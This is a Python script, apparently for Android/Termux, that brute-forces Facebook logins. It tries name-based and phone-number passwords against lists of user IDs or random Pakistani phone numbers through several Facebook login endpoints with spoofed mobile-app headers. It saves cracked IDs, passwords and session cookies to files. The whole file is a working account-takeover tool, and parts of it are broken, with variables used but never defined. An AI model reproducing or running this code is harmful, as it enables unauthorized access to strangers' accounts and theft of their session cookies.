#Created SXB
#user/sdcard/python
from os import system as osRUB
from os import system as cmd
from urllib.request import Request, urlopen
import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
from concurrent.futures import ThreadPoolExecutor as sarfrazssb
from string import * 
from random import randint
from time import sleep as slp
from os import system as cmd
from zlib import decompress
from urllib.request import Request, urlopen
import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
from concurrent.futures import ThreadPoolExecutor as XiyadXiyad
from string import * 
from random import randint
from time import sleep as slp
from os import system as cmd
from zlib import decompress 
import os, platform
try:os.mkdir('/sdcard/SXB')
except:pass
import os, platform,sys,time,json,random,re,string,base64
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
	os.system('clear')
from concurrent.futures import ThreadPoolExecutor
fast_work = ThreadPoolExecutor(max_workers=15).submit
os.system('clear'),print (' Loading Tools...'),time.sleep(1)
logo=("""\033[1;37m     ▄████████ ▀████    ▐████▀ ▀█████████▄  
\033[1;37m    ███    ███   ███▌   ████▀    ███    ███ 
\033[1;37m    ███    █▀     ███  ▐███      ███    ███ 
\033[1;37m    ███           ▀███▄███▀     ▄███▄▄▄██▀  
\033[1;37m  ▀███████████    ████▀██▄     ▀▀███▀▀▀██▄  
\033[1;37m           ███   ▐███  ▀███      ███    ██▄ 
\033[1;37m     ▄█    ███  ▄███     ███▄    ███    ███ 
\033[1;37m   ▄████████▀  ████       ███▄ ▄█████████▀  
\033[1;37m----------------------------------------------\033[1;37m
 [•]  Author  : SOMAIL~SXB
 [•]  GitHub  : SOMAIL-0101
 [•]  Version : 0.0.1
\033[1;37m----------------------------------------------\033[1;37m""")
totaldmp = 0
count = 0
loop = 0
oks = []
cps = []
id = []
ps = []
sid = []
total=[]
methods = []
srange = 0
saved = []
totaldmp = 0
filter = []
def line():
	print('----------------------------------------------')
def server():
	os.system('clear')
	print(logo)
	print(' [1] File Cloning ')
	print(' [2] Random Cloning')
	print(' [3] Create File ')
	print(' [4] Applying 2F')
	print(' [5] WhatsApp Join')
	print(' [0] Exit ')
	line()
	opt = input(' [\033[1;32m+\033[1;37m] Choose option : ')
	if opt =='1':
		method_crack()
	elif opt =='2':
		random_number()
	elif opt =='3':
		random_number()
	elif opt =='4':
		cloner.run()
	elif opt =='5':
		wp()
	elif opt =='3':
		main()
	else:
		print('----------------------------------------------'),print(' [\033[1;32m+\033[1;37m] Invilide Option\033[0;97m')



def method_crack():
    global methods
    os.system('clear')
    print(logo)
    print(f' [1] Method [2] Method [3] Method [4] Method')
    line()
    option = input(' [~] Select method : ')
    if option =='1':
        methods.append('methodA')
        main_crack().crack(id)
    elif option =='2':
        methods.append('methodB')
        main_crack().crack(id)
    elif option =='3':
        methods.append('methodC')
        main_crack().crack(id)
    elif option =='4':
        methods.append('methodD')
        main_crack().crack(id)
    elif option =='0':
        sarfraz()
    else:
      print('\n Select Valid Option ...')
      time.sleep(2)
      method_crack()



class main_crack():
    def __init__(self):
        self.id=[]
    def crack(self,id):
        global methods
        os.system('clear'), print(logo)
        self.file = input(' Put File Name : ')
        try:
            self.id = open(self.file).read().splitlines()
            self.pasw()
        except FileNotFoundError:
            print('Opps File Not Found ...')
            time.sleep(2)
            os.system('clear')
            print(logo)
            print('Try Again ...')
            time.sleep(2)
            main_crack().crack(id)
            
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r [KING] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {'{:.0%}'.format(loop/float(len(self.id)))}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
'method': 'POST', 
'format': 'json', 
'device_id': '0f01b438-fe10-46c2-853d-455eacbaa833', 
"family_device_id": "4c73c7ca-237f-4a7f-9804-cc30e8650430",
'email': '03069637524', 
'password': '9637524', 
'cpl': 'true', 
"credentials_type": "password",
'generate_session_cookies': '1', 
'error_detail_type': 'button_with_disabled', 
'generate_machine_id': '1', 
'locale': 'en_US', 
'client_country_code': 'US', 
'omit_response_on_success': 'false', 
'advertising_id': 'dd6229e0-c1c5-4319-b3f1-0ae8c0ab95a8', 
'fb_api_req_friendly_name': 'authenticate'}
                headers = {'User-Agent': '[FBAN/FB4A;FBAV/331.0.0.2.128;FBBV/606415318;FBDM/{density=3.4,width=1080,height=1495};FBLC/en_US;FBRV/0;FBCR/Jio 4G;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 4;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]',
'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
'Content-Type': 'application/x-www-form-urlencoded', 
'Host': 'b-graph.facebook.com', 
 'X-FB-Net-HNI': '45204', 
'X-FB-SIM-HNI': '45201', 
'X-FB-Connection-Type': 'MOBILE.LTE', 
'X-Tigon-Is-Retry': 'False', 
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 
'x-fb-device-group': '5120', 
'X-FB-Friendly-Name': 'ViewerReactionsMutation', 
'X-FB-Request-Analytics-Tags': 'graphservice', 
'Accept-Encoding': 'gzip, deflate', 
'X-FB-HTTP-Engine': 'Liger', 
'X-FB-Client-IP': 'True', 
'X-FB-Server-Cluster': 'True', 
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62', 
'Connection': 'Keep-Alive'}
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
                    print(f"\r{R} [OK-KING] {sid} | {ps} ")
                    oks.append(sid)
                    open('/sdcard/SSB_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SSB_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r [CP-KING] {sid} | {ps} ")
                     cps.append(sid)
                     open('/sdcard/SSB_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodA(sid, name, ps)
            
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r [SSB] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {'{:.0%}'.format(loop/float(len(self.id)))}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": sid,
"password": ps,
"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_GB",
"client_country_code": "GB",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': '[FBAN/FB4A;FBAV/331.0.0.2.128;FBBV/606415318;FBDM/{density=3.4,width=1080,height=1495};FBLC/en_US;FBRV/0;FBCR/Jio 4G;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 4;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]',
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
                    print(f"\r{R} [OK-KING] {sid} | {ps} ")
                    oks.append(sid)
                    open('/sdcard/SSB_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SSB_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r [CP-KING] {sid} | {ps} ")
                    cps.append(sid)
                    open('/sdcard/SSB_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodC(sid, name, ps)
            
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r [SSB] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {'{:.0%}'.format(loop/float(len(self.id)))}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": sid,
"password": ps,
"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_GB",
"client_country_code": "GB",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': '[FBAN/FB4A;FBAV/331.0.0.2.128;FBBV/606415318;FBDM/{density=3.4,width=1080,height=1495};FBLC/en_US;FBRV/0;FBCR/Jio 4G;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 4;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]',
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
                    print(f"\r{R} [OK-KING] {sid} | {ps} ")
                    oks.append(sid)
                    open('/sdcard/SSB_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SSB_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r [CP-KING] {sid} | {ps} ")
                    cps.append(sid)
                    open('/sdcard/SSB_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodB(sid, name, ps)

    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r [SSB] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {'{:.0%}'.format(loop/float(len(self.id)))}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        except:
            ls = fs
        try:
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                session=requests.Session()
                sua = random.choice(sagent)
                getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={sid}&flow=login_no_pin&refsrc=deprecated&_rdr')
                idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":sid,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":ps,}
                session.headers = {}
                session.headers.update({'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': 'Android', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': sua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-PK,en-GB;q=0.9,en-US;q=0.8,en;q=0.7'})
                complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False)
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [OK-KING] {sid} | {ps} ")
                    oks.append(sid)
                    open('/sdcard/KING_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    #print(f"\r [CP-KING] {sid} | {ps} ")
                    cps.append(sid)
                    open('/sdcard/KING_CP.txt','a').write(sid+'|'+ps+'\n')
                    break
                else:
                    continue
                #time.sleep(31)
            
            loop+=1
        except requests.exceptions.ConnectionError:
             self.methodD(sid, name, ps)
            
    def pasw(self):       
            pw = []
            os.system('clear'), print(logo)
            print(' Put limit between 1 to 30')
            line()
            sl = int(input(' How many password do you want to add : '))
            os.system("clear")
            print(logo)
            print(f' Example : first123,last1122,firstlast,last')
            line()
            if sl =='':
                print('\n Put limit between 1 to 30')
            elif sl > 20:
                print('\n Password limit Should Not Be Greater Than 30')
            else:
                for sr in range(sl):
                    pw.append(input(f' Password {sr+1}: '))
            os.system("clear")
            print(logo)
            print(f' Total IDs : %s ' % len(self.id))
            line()
            print(f"\r    Use flight (airplane) mode before use ")
            line()
            with sarfrazssb(max_workers=30) as ssbworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                       else:
                            pwx =  pw
                            if 'methodA' in methods:
                                ssbworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                ssbworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                ssbworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                ssbworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
            
def random_number():
    user=[]
    os.system('clear')
    print(logo)
    print('[\033[1;32m+\033[1;37m] \033[1;37mExample : 0300 : 0304 : 0318 : 0333 : 0344\033[0;97m')
    line()
    kode = input('[\033[1;32m+\033[1;37m] Put Code : ')
    line()
    limit = int(input('[\033[1;32m+\033[1;37m] Limit : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=70) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('[\033[1;32m+\033[1;37m] Crack Accounts : \033[1;32m'+tl)
        print(46*'\033[1;37m-')
        for guru in user:
            uid = kode+guru
            pwx = [guru]
            yaari.submit(rcrack,uid,pwx,tl)
    line()
    print('[\033[1;32m+\033[1;37m] Cloning Has Been Completed')
    line()
    print('[\033[1;32m+\033[1;37m] OK/CP Saved In KING Folder')
    line()
    input ('[\033[1;32m+\033[1;37m] Again Run This Tool Press Enter')
    random_crack()

def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority':'free.facebook.com',
            'method': 'POST',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-encoding':'utf-8','accept-language': 'en-US,en;q=0.9,en;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '" Not A;Brand";v="100", "Chromium";v="101"',
            'sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
             'user-agent': '[FBAN/FB4A;FBAV/331.0.0.2.128;FBBV/606415318;FBDM/{density=3.4,width=1080,height=1495};FBLC/en_US;FBRV/0;FBCR/Jio 4G;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 4;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]'}
            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            print(iid+'|'+pws+'|'+str(log_cookies))
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print('\033[1;32m[\033[1;32mOK-BXI\033[1;32m] \033[1;32m'+cid+' | '+ps+'\033[0;97m')
                open('/sdcard/KING/OK-KING.txt', 'a').write(uid+' | '+ps+'\n')
                open('/sdcard/KING/OK-KING-Cookie.txt', 'a').write(cid+' | '+ps+'|'+coki+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[\033[1;32mOK-KING\033[1;37m] \033[1;32m'+cid+' | '+ps+'\033[0;97m')
                open('/sdcard/KING/CP-KING.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r[\033[1;31mBXI\033[1;37m] [\033[1;37m%s\033[1;37m/\033[1;37m%s\033[0m]  [\033[1;37mOK \033[1;37m:- \033[1;37m%s\033[1;37m]  \r'%(loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
if __name__ == "__main__":
    server()